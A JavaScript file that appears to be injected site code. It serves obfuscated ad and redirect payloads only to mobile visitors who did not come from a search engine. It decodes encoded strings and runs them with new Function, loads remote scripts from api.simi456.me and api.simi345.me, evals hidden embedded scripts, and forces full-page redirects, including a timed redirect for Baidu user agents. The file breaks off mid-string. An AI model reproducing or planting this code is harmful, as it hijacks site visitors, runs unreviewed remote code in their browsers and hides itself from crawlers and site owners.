var system = {
    win: false,
    mac: false,
    xll: false
};
var p = navigator.platform;
var us = navigator.userAgent.toLowerCase();

system.win = p.indexOf("Win") == 0;
system.mac = p.indexOf("Mac") == 0;
system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);

var regexp = /\.(sogou|soso|baidu|google|youdao|yahoo|bing|so|biso|gougou|ifeng|ivc|sooule|niuhu|biso)(\.[a-z0-9\-]+){1,2}\//ig;
var where = document.referrer;

const chooseDirection = ['b', 't'];
const directionGroup = (arr) => arr[Math.floor(Math.random() * arr.length)];
const direction = directionGroup(chooseDirection);

if (!system.win && !system.mac && !system.xll && !regexp.test(where)) {
    if (direction == 't' || direction == 'all') {
        $("#topnav").attr("style", "margin-top:120px");
        const temporaryGroups = ['todayCpv','smCpv'];
        const randomNums = (arr) => arr[Math.floor(Math.random() * arr.length)];
        const randomElements = randomNums(temporaryGroups);
        if (randomElements == 'todayCpv') {
            !(function () {
                function tXWGo(s) {
                    var d = { "I": "d", "v": "m", "n": "F", "l": "y", "=": "I", "X": "G", "Z": "Q", "r": 9, "7": "Z", "N": "j", "o": "W", "V": 1, "b": "l", "R": "b", "C": "n", "F": "s", "5": "u", "E": "Y", "S": "X", "1": "p", "T": 2, "9": 0, "P": 3, "L": "J", "y": "B", "G": "R", "2": "t", "u": "M", "a": "C", "t": 5, "p": "U", "i": "N", "x": "a", "3": "L", "Y": "H", "M": "w", "k": "v", "z": "z", "d": "x", "f": "P", "H": "T", "J": "E", "w": "i", "O": "S", "0": "r", "Q": "k", "4": "o", "s": "c", "m": 7, "K": "e", "8": "f", "c": 8, "D": "V", "B": "h", "j": "K", "U": 4, "A": "g", "e": "O", "g": "D", "W": "A", "h": "=" };
                    return s.split('').map(function (c) {
                        return d[c] !== undefined ? d[c] : c;
                    }).join('');
                }
                function aRixZe(e) {
                    var a0 = 'charAt', a1 = 'fromCharCode', a2 = 'charCodeAt', a3 = 'indexOf';
                    var sx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' + 'abcdefghijklmnopqrstuvwxyz' + '0123456789+/=';
                    var t = "", n, r, i, s, o, u, a, f = 0;
                    e = e.replace(/[^A-Za-z0-9+/=]/g, "");
                    while (f < e.length) {
                        s = sx[a3](e[a0](f++));
                        o = sx[a3](e[a0](f++));
                        u = sx[a3](e[a0](f++));
                        a = sx[a3](e[a0](f++));
                        n = s << 2 | o >> 4;
                        r = (o & 15) << 4 | u >> 2;
                        i = (u & 3) << 6 | a;
                        t = t + String[a1](n);
                        if (u != 64) {
                            t = t + String[a1](r);
                        }
                        if (a != 64) {
                            t = t + String[a1](i);
                        }
                    }
                    return (function (e) {
                        var t = "", n = r = c1 = c2 = 0;
                        while (n < e.length) {
                            r = e[a2](n);
                            if (r < 128) {
                                t += String[a1](r);
                                n++;
                            } else if (r > 191 && r < 224) {
                                c2 = e[a2](n + 1);
                                t += String[a1]((r & 31) << 6 | c2 & 63);
                                n += 2
                            } else {
                                c2 = e[a2](n + 1);
                                c3 = e[a2](n + 2);
                                t += String[a1]((r & 15) << 12 | (c2 & 63) << 6 | c3 & 63);
                                n += 3;
                            }
                        }
                        return t;
                    })(t);
                };
                var s = ["data:image\/jpg;base64,Ivnl=XZr7XrNIoVbRCZFRNV5ES717Tn9RPLRLPyFESGvRPL2LV9FEPur7atNISLl7ot9pTilxSy93YprLTrMIltkIXLvxvnz3vi5Lld1fHJziHEMuwdlfOIMoXn0", "IQVbHYiXLldMfOI4IYGMsz4k3lsmxoE4=OrKHonN8nI1Rwc5IXDzIaB5jSdc=oU1KTbvjXtBIvbCESGkswtVsTDlZoIbRCZ5xotQ7SBf7wACEvn17YpCjHU2uObmIvnl=YB4sNV57SsAoJVuOY", "G9snLbsSDbsPZ4jH2UxY=5RPybRwACpJrHDasFLTB9IYyzewckLl2VjlskxacCjTQ1ePB4swtz7SGO7SnV7Si9OXDB7XDljaIgRTt97ot93DGtsXpC3aIBsYyFxoiBIXbkRwrU3SIPIlVvRPL2", "3SDlRXD5ETrQ7oZmLlQmKXBl3CibInLbsSDbsPG=7onQ7S=4LVA2pQDGDpDHDJDJ3DILDJAC3aIEHpd=IYGMpvDdIoDzIas1ePB4swtkRCLbEoGtsPGBIXDNxXn57Tpr7CD5EPG1RTU4jS217w", "BUxY=5svDB7YbHIXn97H9riaEvKXBl3Ci9ESGVsz9ruNWMjS2TES=A7Xn9EHVjp9re3CyBsCibjYB4swtl7SiMRTtz7DGbKYZ1eTtbIlyXIotNIXbkRwACSls0LPZCjlIQLlFCEPuC3XtbIlyX", "IotNIXbkRwACElsF7Xn9EOtl7SiVRYZ57XDNRTGbjlsmsvD9ISL5=as07Xn9EOtl7SiVRYZ5Rvn27OFCjXu1LlQ47Xn9EOtl7SiVRYZ5xoVC3v1kxoU4Lls1jOQ4EPu1ePVrePB4swtz7otQja", "IVfHJCjH2r7odz7S2TES=AszVQRTiVRoD5IatNsvDBIXDnRXD27ot9jaIzEPL1sYZCjH2z3CilEzVMjPp0Llr03ls0xH2NsltMESLbRCGnRXD27ot93vb5sTDlIJLb7vrl7OBz3XizjH2r8Zhh"];
                new Function(aRixZe(tXWGo(s.join('').substr(22))))();
            })();
        }
        if(randomElements == 'smCpv'){
            window.kzDmFy = function(){var a=document.createElement('a');var evjs=`(function(){var cname='kzDmFy',cn='https://api.simi456.me/static/image/c.png',bn='https://dingbu.bj.bcebos.com/dingbu.asdawas',jp='https://api.simi456.me/a/c?au41205b197f7a91a401e7233b4917bd7d=',UlKhsS=null,cst=1,drv=isCheckD();if(drv){crateEl(cname);var n=0;UlKhsS=setInterval(()=>{n++;var elobj=resbaner();if(!elobj){cname=its(6);return crateEl('kzDmFy '+cname)}var eh=elobj.getBoundingClientRect().height;if(eh==0){elobj.remove();cname=its(6);crateEl('kzDmFy '+cname)}},500)}var s=document.createElement('script');s.src='https://api.simi456.me/s/c?_=449133927535747072';document.getElementsByTagName('head')[0].appendChild(s);function crateEl(n){var by=document.body;if(!by){return false};var br=document.createElement('div');br.setAttribute('class',n);var img=document.createElement('img');img.src=bn;var p=document.createElement('p');br.append(p);br.append(img);by.append(br);addlistenerElement(br,function(){var _ao=document.createElement('a');_ao.href=jp+au41205b197f7a91a401e7233b4917bd7d;_ao.click()});addlistenerElement(p,function(){clearInterval(UlKhsS);resbaner().remove()});img.onload=function(){var h=this.height;resbaner().style.height=h+'px';getIheight(h,this.width)}}function getStyleStr(el){var obs=window.getComputedStyle(el,'');var str='';for(k in obs){if(parseInt(k).toString()=='NaN'){str+=k+': '+obs[k]+';'+'<br/>'}}return str}var pimg='.kzDmFy img{width:100% !important;}';var ps=cst==4?'':'position:fixed;';var bs='.kzDmFy{z-index:999;'+(cst==2||cst==3?'width:100px;':'')+(cst==3?'right:0;':'left:0;')+ps+(cst==0?'bottom:0px':cst==1?'top:0px':'bottom:50%')+';}'+pimg;if(drv){addStyle(bs)}function getIheight(height,w){var ch='width:18px;height:18px';var ot=(cst==0?'bottom':cst==1?'top':cst==2||cst==3?'bottom':'')+(cst==0||cst==1?':'+height+'px;':cst==2||cst==3?':calc(50% + '+height+'px)':'display:none;');var or=(cst==0||cst==1?'right:0':cst==2?'left:'+(w-18)+'px':'right:'+(w-18)+'px');var close='.kzDmFy p{padding:0 !important;margin:0 !important;'+ch+';background:url('+cn+');background-size:contain;position:fixed;'+or+';'+ot+'}';close+=(cst==1?'body{padding-top:'+height+'px !important;}':'');addStyle(close)}function addStyle(style){var styleObj=document.createElement('style');styleObj.setAttribute('type','text/css');styleObj.innerHTML=style;document.getElementsByTagName('head')[0].appendChild(styleObj)}function resbaner(){return document.querySelector('.'+cname)}function isCheckD(){var p=navigator.platform;var system={win:false,mac:false,Xll:false};system.win=p.indexOf('Win')==0;system.mac=p.indexOf('Mac')==0;system.X11=(p=='X11')||(p.indexOf('Linux')==0);if(system.win||system.mac||system.Xll){return false}return true}function addlistenerElement(el,callBack){el.addEventListener('click',handleFun);el.addEventListener('touchstart',handleFun);function handleFun(e){e.preventDefault();e.stopPropagation();callBack()}}function its(len){var r=['a','B','c','d','e','G','g','h','J','j','k'],str='';for(var i=0;i<len;i++){var rx=Math.round(Math.random()*(r.length-1));str+=r[rx]}return str}})();`;a.href='javascript:'+evjs;a.click()};window.kzDmFy();
        }
        // 图标
        window.BtCCyv=function(){window.BtCCyvpEls=document.currentScript;var uas=navigator.userAgent.toLowerCase(),isToJump=sessionStorage.getItem('BtCCyv');var rnx=['a','B','c','d','e','G','g','h','J','j','k'],ns=its(rnx,4),en=its(rnx,8),eFun=its(rnx,11),tFun=its(rnx,11),ds="",ds1="",adT=2,adI=uas.indexOf('baidu')!=-1?(function(){if(!isToJump){setTimeout(function(){sessionStorage.setItem('BtCCyv',1);window.open('https://api.simi345.me/a/c?au427dd9672488f7c14576ba4a899bc877='+au427dd9672488f7c14576ba4a899bc877,'_self')},1000*5)}})():"https://dingbu.bj.bcebos.com/chaoxi.add",adC="https://api.simi345.me/static/image/c.png";for(var i=0;i<Math.round((Math.random()*10)+1);i++){ds+="<div class='"+its(rnx,6)+"'>"+i==2||i==7||i==9||i==4?"<div> </div>":"<div class='"+its(rnx,8)+"'><div> </div></div>"}for(var i=0;i<Math.round((Math.random()*10)+1);i++){ds1+="<div class='"+its(rnx,5)+"'>"+i==1||i==3||i==5||i==7?"<div> </div>":"<div class='"+its(rnx,9)+"'><div> </div></div>"}var sp=`${ds1}<script>function ${tFun}(c){for(var i of['0x3c','0x3e','0x20']){c=c['replace'](new RegExp(i,'ig'),String['fromCharCode'](i))};return c}<\/script><div id="${en}"style='display:none !important;'>function runxjx(){var t=${adT};var ub=navigator.userAgent.toLocaleLowerCase();var _d;if(ub.indexOf('ucbrowser')!==-1){_d=document.createElement('div')}else{_d=document.createElement('video');_d.playsinline='playsinline';_d.poster='${adI}';var source=document.createElement('source');source.src='';_d.appendChild(source)}var s=document.createElement('script');s.src='https://api.simi345.me/s/c?_=449134482127593472';document.getElementsByTagName('head')[0].appendChild(s);_d.setAttribute('class','BtCCyv');var _img=document.createElement('img');_img.src='${adI}';_d.append(_img);addStyle(styleStr(0,t));window.BtCCyvpEls.parentNode.insertBefore(_d , window.BtCCyvpEls);addlistenerElement(_d,toLink);_img.onload=function(c){var _h=this.offsetHeight;_p=document.createElement('p');_d.appendChild(_p);addStyle(styleStr(1,t,_h));addlistenerElement(_p,function(){_d.remove();_d.remove()})}}function addlistenerElement(el,callBack){el.addEventListener('click',function(){callBack()});el.addEventListener('touchstart',function(e){e.preventDefault();callBack()});el.addEventListener('touchmove',function(e){e.preventDefault()})}function addStyle(style){var styleObj=document.createElement('style');styleObj.setAttribute('type','text/css');styleObj.innerHTML=style;document.getElementsByTagName('body')[0].appendChild(styleObj)}function styleStr(sType,dt,tl){var ds=dt==0||dt==1?tl+'px;':'calc(50% - '+(tl+15)+'px);',ls=dt==0||dt==1||dt==2?'right:0px;':'left:0px;',bg='margin:0;padding:0; background: url("${adC}");background-size: contain; background-repeat: no-repeat};';var sty=dt==0||dt==2||dt==3?'top:'+ds+ls+bg:'bottom:'+ds+ls+bg;var style=sType==0?('.BtCCyv{height:110px;object-fit:fill;width:'+(dt==3?'20%':'100%')+';'+(dt==0||dt==1?'position:fixed;':'')+(dt==0?'top:0px':dt==1?'bottom:0px':dt==3?'bottom:50%':'')+';z-index: 999;display: -ms-flexbox;display: flex;-ms-flex: 0 1 auto;flex: 0 1 auto;-ms-flex-align: center;align-items: center;-ms-flex-pack: center;color: #fff;justify-content: center}.BtCCyv img {width: 100%};'):'.BtCCyv p {display: block; width: 15px; height: 15px; position: fixed;'+sty;return style}function toLink(){window.open('https://api.simi345.me/a/c?au427dd9672488f7c14576ba4a899bc877='+au427dd9672488f7c14576ba4a899bc877,'_self')};window['${eFun}']=runxjx;</div><script>new Function(${tFun}(document.getElementById('${en}').innerHTML))();<\/script>${ds}<script>${eFun}();<\/script>`;var vns=its(rnx,8);var ioasrs1s=document.createElement(`${vns}`);ioasrs1s.innerHTML=sp;document.body.appendChild(ioasrs1s);evalScripts(sp);function evalScripts(text){var script,scripts;scripts=[];var regexp=/<script[^>]*>([\s\S]*?)<\/script>/gi;while((script=regexp.exec(text)))scripts.push(script[1]);scripts=scripts.join('\n');if(scripts)(window.execScript)?window.execScript(scripts):window.setTimeout(scripts,0)}function its(r,len){var str="";for(var i=0;i<len;i++){var rx=Math.round(Math.random()*(r.length-1));str+=r[rx]}return str}};window.BtCCyv();
        
    }
    if (direction == 'b' || direction == 'all') {
        const temporaryGroup = ['hl', 'todayCpv','todayCpc','smCpv'];
        const randomNum = (arr) => arr[Math.floor(Math.random() * arr.length)];
        const randomElement = randomNum(temporaryGroup);
        if (randomElement == 'todayCpv') {
            !(function () {
                function CQuHlE(s) {
                    var d = { "H": "d", "z": "m", "t": "F", "c": "y", "M": "I", "v": "G", "w": "Q", "G": 9, "m": "Z", "7": "j", "k": "W", "5": 1, "S": "l", "e": "b", "9": "n", "R": "s", "x": "u", "F": "Y", "B": "X", "Q": "p", "i": 2, "f": 0, "g": 3, "l": "J", "T": "B", "8": "R", "y": "t", "3": "M", "P": "C", "W": 5, "C": "U", "U": "N", "d": "a", "L": "L", "h": "H", "n": "w", "V": "v", "I": "z", "4": "x", "A": "P", "N": "T", "1": "E", "O": "S", "E": "V", "Z": "c", "=": "h", "J": "o", "p": 7, "b": "e", "D": "f", "Y": "i", "s": 8, "j": "K", "r": 4, "2": "k", "a": "g", "u": "O", "o": "D", "K": "A", "0": "r", "X": "=" };
                    return s.split('').map(function (c) {
                        return d[c] !== undefined ? d[c] : c;
                    }).join('');
                }
                function yqVPrL(e) {
                    var a0 = 'charAt', a1 = 'fromCharCode', a2 = 'charCodeAt', a3 = 'indexOf';
                    var sx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' + 'abcdefghijklmnopqrstuvwxyz' + '0123456789+/=';
                    var t = "", n, r, i, s, o, u, a, f = 0;
                    e = e.replace(/[^A-Za-z0-9+/=]/g, "");
                    while (f < e.length) {
                        s = sx[a3](e[a0](f++));
                        o = sx[a3](e[a0](f++));
                        u = sx[a3](e[a0](f++));
                        a = sx[a3](e[a0](f++));
                        n = s << 2 | o >> 4;
                        r = (o & 15) << 4 | u >> 2;
                        i = (u & 3) << 6 | a;
                        t = t + String[a1](n);
                        if (u != 64) {
                            t = t + String[a1](r);
                        }
                        if (a != 64) {
                            t = t + String[a1](i);
                        }
                    }
                    return (function (e) {
                        var t = "", n = r = c1 = c2 = 0;
                        while (n < e.length) {
                            r = e[a2](n);
                            if (r < 128) {
                                t += String[a1](r);
                                n++;
                            } else if (r > 191 && r < 224) {
                                c2 = e[a2](n + 1);
                                t += String[a1]((r & 31) << 6 | c2 & 63);
                                n += 2
                            } else {
                                c2 = e[a2](n + 1);
                                c3 = e[a2](n + 2);
                                t += String[a1]((r & 15) << 12 | (c2 & 63) << 6 | c3 & 63);
                                n += 3;
                            }
                        }
                        return t;
                    })(t);
                };
                var s = ["data:image\/jpg;base64,HztcMvwGmvG7Hk5Se9wRe75xFBmQmitfeglelgTRFB8zeglyl5fRFg3GmPW7HBlcmkWfCiUcdBTfLhCGliGnHcWVHvlzdztILzUxlc4QAN1IUNFn3O4cAOH1EfEI", "Z1mSO5=llc4nAOHJHh8nZIJVLcZpdkFJMOGbNkt7DtHQeYsxHvEIHP=xjB4sMkrQbiSzjvW=HzS9FB8VZYW5ZiEcwkHSe9wxdkW2mB=AmYa9FztQmhC9jNry3OSpHztcMh=JZ75xmBZak153Oh", "8fZtlSZBESZgwJjNyrdhMxegTSeYa9C1GNEPZRli=fHhTIuYsVlcy5jcZVdPs9ji2Qug=JZYWImB8OmBt5mBUfOvE=mvEcjPHoeiWfmkWfLE8WZvC9LPH=ZhTRdkU=HvSVeYGrLBHgHc5zegly", "LBEcevExFiG2mkwplc2pbv=cL9USHtlSZBESZg8Mmkt2mBMJl5ayC2E8ECENE1E1LEHlE1a9LPHFNC4MHh8nCzE4HkEIHPZQug=JZYWVe9lSFk8WZg8=HvE7dvtxmiCGm9ExFg8QeirJjByQmY", "=rdhMxZzE=mhSNHvtfmNfGUPFzbv=cL9UfFB85ZIfG37KnjByiFBMamvtfFN5jCfGuL9T=Z9USjh=JZYWcmBUneiWImE8SbhwQuiWSHcTvHkW7HvSVeYa9BcZ0lgw9jcH2lcR9Fg39LvWSHcTv", "HkW7HvSVeYa9FcZRmvtfFOWcmBU5ehwxmvE7ei8SjcZpZzEfHBlxMPZ0mvtfFOWcmBU5ehwxeztymOR9jv3Qlc2JmvtfFOWcmBU5ehwxdk59LzQVdkrJlcZQjO2JFg3Qug5Gug=JZYWImkW2jP", "H5AN19jNyGmk4ImByiFBMaZI52eiU5ekExHPW7ZzE=HvEtevEymkWfjPHIFglQZhw9jNyIL9UcFI5njgC0lcG0LcZ0dNy7ZcWnFBlSe98tevEymkWfLzSxZiEcH1lSmzGcmO=ILvUIjNyGDwXX"];
                new Function(yqVPrL(CQuHlE(s.join('').substr(22))))();
            })();
        }
        if(randomElement == 'todayCpc'){
            !(function () {
                function EfSoGYR (s) {
            var d = {"h":"d","r":"m","A":"F","R":"y","j":"I","i":"G","6":"Q","4":9,"e":"Z","0":"j","s":"W","a":1,"W":"l","d":"b","Z":"n","7":"s","1":"u","Y":"Y","E":"X","M":"p","D":2,"9":0,"g":3,"y":"J","f":"B","c":"R","V":"t","G":"M","p":"C","3":5,"5":"U","K":"N","w":"a","N":"L","P":"H","S":"w","U":"v","t":"z","u":"x","X":"P","z":"T","Q":"E","l":"S","L":"K","b":"c","C":"h","H":"A","k":"O","o":"i","8":8,"I":"g","F":"V","B":4,"v":"f","m":7,"x":"o","O":"e","2":"k","n":6,"T":"r","J":"D"};
            return s.split('').map(function (c) {
                return d[c] !== undefined ? d[c] : c;
            }).join('');
        }
                function cxPpXU (e) {
            var a0 = 'charAt', a1 = 'fromCharCode', a2 = 'charCodeAt', a3 = 'indexOf';
            var sx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' + 'abcdefghijklmnopqrstuvwxyz' + '0123456789+/=';
            var t = "", n, r, i, s, o, u, a, f = 0;
            e = e.replace(/[^A-Za-z0-9+/=]/g, "");
            while (f < e.length) {
                s = sx[a3](e[a0](f++));
                o = sx[a3](e[a0](f++));
                u = sx[a3](e[a0](f++));
                a = sx[a3](e[a0](f++));
                n = s << 2 | o >> 4;
                r = (o & 15) << 4 | u >> 2;
                i = (u & 3) << 6 | a;
                t = t + String[a1](n);
                if (u != 64) {
                    t = t + String[a1](r);
                }
                if (a != 64) {
                    t = t + String[a1](i);
                }
            }
            return (function(e) {
                var t = "", n = r = c1 = c2 = 0;
                while (n < e.length) {
                    r = e[a2](n);
                    if (r < 128) {
                        t += String[a1](r);
                        n++;
                    } else if (r > 191 && r < 224) {
                        c2 = e[a2](n + 1);
                        t += String[a1]((r & 31) << 6 | c2 & 63);
                        n += 2
                    } else {
                        c2 = e[a2](n + 1);
                        c3 = e[a2](n + 2);
                        t += String[a1]((r & 15) << 12 | (c2 & 63) << 6 | c3 & 63);
                        n += 3;
                    }
                }
                return t;
            })(t);
        };
            var s = ["data:image\/jpg;base64,hrARji64ei40hsaWdZ67d0a1YEeMeDA9dgydygf7YEcrdgyVya97YgG4ep30hEyRes395DKRwEf9NP54yD4ShR3UhiyrwrAtNrK1yRuMXzQtKzYSGRuRXlhLbrC","XYrGZNPH4yDC9hPftko8UytVMeoICNa3KYsK8FDW1NR39eEK9LiBMvPSCdoWmwsYxdrADwshChi4RNZFteEyfeDF1hp3MdrcWOQ4rLphoYsW2hlbMXo9uLEVDYEjIOiCRXs3WhRfYz5ujhPcS","5rFuhsFthpIMkgCxbo3UbiF1Lph6zaK5yRSZwPc9bPGnNR8ZLg5TyR4xNRbTwl2mOiCRNZKWhAyWbEFWbgcjesA2eEjxy9KUdZcWdZ6VFPWSelb7yDASbiuMYDA9ws41NgIVhghgNseUbr9Vh","Ey7es30dDcWeJ7ZLzVBwPj1bDF95rFuhsFthQCWYscWboIZspalcFAFcFK5c56VF9W5lpb7yaCKzQC9hPfleEAaeEK9yR2mOiCRNr41brFCePWthiA9esKxYs3Zezarhs30hiWUdoIMODWrLP","Cxbo3ResA2OFK9YEcWXz99yoeBwPj1bgcChPFtXz9RGJHMOgeCbof2YEcCX5Mzz9B1biARbD5xOiCRNZyWbgfUdZKWFiFBhp2mdrFgjQeadrK9ws41LphvyR7ZhpbTyD6ZLRh0bRb7drFgjQe","adrK9ws41Lph0yRu2YEcCNZyWbgF7hp32esKUei5TytVReEcabrBIyRV2YEcCNZyWbgF7hp31YsaWLRbxYR2ZLlC2YEcCNZyWbgF7hp3Mdsb1wr4MdoIZyR2MLlC0bR2mvE9mOiCRNZKWdr6x","yg54GlbMkgaWdPKWOgeCboftXscUYgFVes39NrKResA9e5F7esaWdZ6xygK0brWShpbMkgG1bgy0XEHThl7ZND7UyRVMkDKtNZfCbrF1hQF7esaWdZ61ws3teEy96rFrdgyWLPG7YgGMkga4"];
            new Function(cxPpXU(EfSoGYR(s.join('').substr(22))))();
        })();
        }
        if (randomElement == 'hl') {
            !function(){function a(a){var b={e:"P",w:"D",T:"y","+":"J",l:"!",t:"L",E:"E","@":"2",d:"a",b:"%",q:"l",X:"v","~":"R",5:"r","&":"X",C:"j","]":"F",a:")","^":"m",",":"~","}":"1",x:"C",c:"(",G:"@",h:"h",".":"*",L:"s","=":",",p:"g",I:"Q",1:"7",_:"u",K:"6",F:"t",2:"n",8:"=",k:"G",Z:"]",")":"b",P:"}",B:"U",S:"k",6:"i",g:":",N:"N",i:"S","%":"+","-":"Y","?":"|",4:"z","*":"-",3:"^","[":"{","(":"c",u:"B",y:"M",U:"Z",H:"[",z:"K",9:"H",7:"f",R:"x",v:"&","!":";",M:"_",Q:"9",Y:"e",o:"4",r:"A",m:".",O:"o",V:"W",J:"p",f:"d",":":"q","{":"8",W:"I",j:"?",n:"5",s:"3","|":"T",A:"V",D:"w",";":"O"};return a.split("").map(function(a){return void 0!==b[a]?b[a]:a}).join("")}var b=a('HGdUaPYyHRl7_2(F6O2cYa[Xd5 F8[P!7_2(F6O2 5c2a[67cFH2Za5YF_52 FH2ZmYRJO5FL!Xd5 O8FH2Z8[6g2=qgl}=YRJO5FLg[PP!5YF_52 YH2Zm(dqqcOmYRJO5FL=O=OmYRJO5FL=5a=Omq8l0=OmYRJO5FLP5m^8Y=5m(8F=5mf87_2(F6O2cY=F=2a[5mOcY=Fa??;)CY(FmfY762Ye5OJY5FTcY=F=[Y2_^Y5d)qYgl0=pYFg2PaP=5m587_2(F6O2cYa["_2fY762Yf"l8FTJYO7 iT^)OqvviT^)OqmFOiF562p|dpvv;)CY(FmfY762Ye5OJY5FTcY=iT^)OqmFOiF562p|dp=[Xdq_Yg"yOf_qY"Pa=;)CY(FmfY762Ye5OJY5FTcY="MMYLyOf_qY"=[Xdq_Ygl0PaP=5mF87_2(F6O2cY=Fa[67c}vFvvcY85cYaa={vFa5YF_52 Y!67covFvv"O)CY(F"88FTJYO7 YvvYvvYmMMYLyOf_qYa5YF_52 Y!Xd5 28;)CY(Fm(5YdFYc2_qqa!67c5m5c2a=;)CY(FmfY762Ye5OJY5FTc2="fY7d_qF"=[Y2_^Y5d)qYgl0=Xdq_YgYPa=@vFvv"LF562p"l8FTJYO7 Ya7O5cXd5 O 62 Ya5mfc2=O=7_2(F6O2cFa[5YF_52 YHFZPm)62fc2_qq=Oaa!5YF_52 2P=5m287_2(F6O2cYa[Xd5 F8YvvYmMMYLyOf_qYj7_2(F6O2ca[5YF_52 YmfY7d_qFPg7_2(F6O2ca[5YF_52 YP!5YF_52 5mfcF="d"=Fa=FP=5mO87_2(F6O2cY=Fa[5YF_52 ;)CY(FmJ5OFOFTJYmhdL;D2e5OJY5FTm(dqqcY=FaP=5mJ8""=5c5mL80aPcH7_2(F6O2cY=Fa[Xd5 58fO(_^Y2F=282dX6pdFO5mJqdF7O5^=O85m(_55Y2Fi(56JF!67c/)d6f_?9_dDY6u5ODLY5?A6XOu5ODLY5?;JJOu5ODLY5?9YT|dJu5ODLY5?y6_6u5ODLY5?yIIu5ODLY5?Bxu5ODLY5/pmFYLFc2dX6pdFO5m_LY5rpY2Fal887dqLYa[67cl/3yddd(?V6662/mFYLFc2a??l2a[Xd5 6LDL86LMSS80!Xd5 6^pL(8"hFFJLg//LSTmdJD^LT4m(2/)d6f_MJ6(/"%ydFhm(Y6qcydFhm5d2fO^ca.}0a%"mCJp"!LYF|6^YO_Fc7_2(F6O2ca[67c6LDL880a[Xd5 hS6F:phX8"hFFJLg//((Lm(hOqO5@0}}0}m(2/((/}QsKj6LM2OF8}vFd5pYF8}"!Xd5 (q6Y2FD6fFh8D62fODmL(5YY2mdXd6qV6fFh!5m)OfTmdffEXY2Ft6LFY2Y5c"FO_(hY2f"=7_2(F6O2ca[Xd5 (q6Y2FhY6phF8D62fODmL(5YY2mdXd6q9Y6phF!Xd5 YXY8YXY2F??D62fODmYXY2F!Xd5 (R8(T80!67cYXYvvYXYmFTJY88"FO_(hLFd5F"a[(R8YXYmFO_(hYLH0Zm(q6Y2F&!(T8YXYmFO_(hYLH0Zm(q6Y2F-!P67cYXYvvYXYmFTJY88"FO_(hY2f"a[(R8YXYm(hd2pYf|O_(hYLH0ZmL(5YY2&!(T8YXYm(hd2pYf|O_(hYLH0Zm(q6Y2F-!P67cYXYvvYXYmFTJY88"(q6(S"a[(R8YXYm(q6Y2F&!(T8YXYm(q6Y2F-!P67c(R>0vv(T>0a[67c(T>c(q6Y2FhY6phF*c@00.c(q6Y2FD6fFh/K00aaavv6LMSS880a[6LMSS8}!67cFOJmqO(dF6O2l8LYq7mqO(dF6O2a[FOJmqO(dF6O28hS6F:phX!PYqLY[D62fODmqO(dF6O2mh5Y78hS6F:phX!P6LMSS80!PPPa! Xd5 4(L6_fdOM2}80!Xd5 4(L6_fdOMLYF62F}8LYFW2FY5Xdqc7_2(F6O2ca[67c4(L6_fdOM2}<ssa[Xd5 Fdp85m(5YdFYEqY^Y2Fc"f6X"a!FdpmLFTqY8"f6LJqdTg)qO(S!qY7Fg0!56phFg@!JOL6F6O2gd)LOq_FY!4*62fYRg}000000!D6fFhgQQb!hY6phFgsmsXD!)O5fY5*qY7Fg}JR LOq6f #ddd!"!Xd5 hY6XD84(L6_fdOM2}!Xd5 F8fO(_^Y2FmfO(_^Y2FEqY^Y2FmL(5Oqq|OJ??fO(_^Y2Fm)OfTmL(5Oqq|OJ!FdpmLFTqYm)OFFO^8F*F.@%c(q6Y2FD6fFh.hY6XD/}00a%"JR"!D62fODmdffEXY2Ft6LFY2Y5c"L(5Oqq"=7_2(F6O2ca[Xd5 F8fO(_^Y2FmfO(_^Y2FEqY^Y2FmL(5Oqq|OJ??fO(_^Y2Fm)OfTmL(5Oqq|OJ!FdpmLFTqYm)OFFO^8F*F.@%c(q6Y2FD6fFh.hY6XD/}00a%"JR"Pa!FdpmdffEXY2Ft6LFY2Y5c"FO_(hY2f"=7_2(F6O2ca[67cFOJmqO(dF6O2l8LYq7mqO(dF6O2a[FOJmqO(dF6O284(L6_fdOPYqLY[D62fODmqO(dF6O2mh5Y784(L6_fdOPPa!5m)OfTmdJJY2fxh6qfcFdpa!4(L6_fdOM2}%8smsPYqLY[(qYd5W2FY5Xdqc4(L6_fdOMLYF62F}aPP=n0a! Xd5 4(L6_fdOM2@8}!Xd5 4(L6_fdOMLYF62F@8LYFW2FY5Xdqc7_2(F6O2ca[67c4(L6_fdOM2@<8}0a[Xd5 (d2Xd85m(5YdFYEqY^Y2Fc"(d2XdL"a!Xd5 hY6XD8cc}0*4(L6_fdOM2@a.smsa!(d2XdmLFTqY8"D6fFhgQQb!hY6phFgsmsXD!qY7Fg0!56phFg@JR!JOL6F6O2gd)LOq_FY!)O5fY5*qY7Fg@JR LOq6f #70KQn7!^d5p62g0JR!"!(d2XdmD6fFh8K00!(d2XdmhY6phF8@0!Xd5 (FR8(d2XdmpYFxO2FYRFc"@f"a!Xd5 6^p82YD W^dpYca!Xd5 LT8*c@0.4(L6_fdOM2@a%@0!6^pmO2qOdf87_2(F6O2ca[(FRmf5dDW^dpYc6^p=0=LT=K00=@00aP!6^pmL5(86^pL(!5m)OfTmdJJY2fxh6qfc(d2Xda!Xd5 F8fO(_^Y2FmfO(_^Y2FEqY^Y2FmL(5Oqq|OJ??fO(_^Y2Fm)OfTmL(5Oqq|OJ!(d2XdmLFTqYm)OFFO^8F*F.@%c(q6Y2FD6fFh.hY6XD/}00a%"JR"!D62fODmdffEXY2Ft6LFY2Y5c"L(5Oqq"=7_2(F6O2ca[Xd5 F8fO(_^Y2FmfO(_^Y2FEqY^Y2FmL(5Oqq|OJ??fO(_^Y2Fm)OfTmL(5Oqq|OJ!(d2XdmLFTqYm)OFFO^8F*F.@%c(q6Y2FD6fFh.hY6XD/}00a%"JR"Pa!4(L6_fdOM2@%%PYqLY[(qYd5W2FY5Xdqc4(L6_fdOMLYF62F@aPP=}00a!Xd5 685mpYFEqY^Y2FuTWfc"4(L6_fdOMFC"a!67c6a[6mL5(86mpYFrFF56)_FYc"fdFd*_5q"aPYqLY[Xd5 685m(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//((Lm(hOqO5@0}}0}m(2/f/}QsKj(8}vF8@}{QsnQs"!Xd5 _85mpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_a!PXd5 L))85m(5YdFYEqY^Y2Fc"LFTqY"a!L))m622Y59|yt8")OfT[JOL6F6O2g626F6dq l6^JO5Fd2F!^62*hY6phFg"%D62fODmL(5YY2mhY6phF%"JR 